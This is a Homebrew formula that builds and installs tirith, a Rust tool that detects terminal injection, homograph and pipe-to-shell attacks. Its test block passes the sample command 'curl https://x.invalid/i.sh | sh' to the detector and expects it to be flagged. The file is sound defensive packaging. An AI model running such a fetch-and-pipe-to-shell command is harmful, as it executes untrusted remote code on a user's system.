class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.5.0.tar.gz"
  sha256 "bcde1306c0229dff305f9469ce1a47bc05f588342e77e901a6cfaa04e29a0ccb"
  license "AGPL-3.0-only"
  compatibility_version 1
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_golden_gate: "deb0fd62298eee14703bf3386c56b7270c08736fe2127743c475523ce6ff677d"
    sha256 cellar: :any_skip_relocation, arm64_tahoe:       "ee5d9eff3a6d5479854173aa55f271ecaea697a5953470ef5d09969408f209e5"
    sha256 cellar: :any_skip_relocation, arm64_sequoia:     "cc9803643bc14e745e71d24f57226a7d10fc61e4f30e94f432e4d300641b387d"
    sha256 cellar: :any,                 arm64_linux:       "153b7a640b263619693825d4107beae2e8c6cbeee6929b89b1710b9e44e8bc63"
    sha256 cellar: :any,                 x86_64_linux:      "2ed67475675191c0fa4343cb0ecf8d9720281d3a1a411a9351ade676e9b95ece"
  end

  depends_on "rust" => :build

  deny_network_access!

  def fetch
    system "cargo", "fetch", *std_cargo_fetch_args
  end

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end
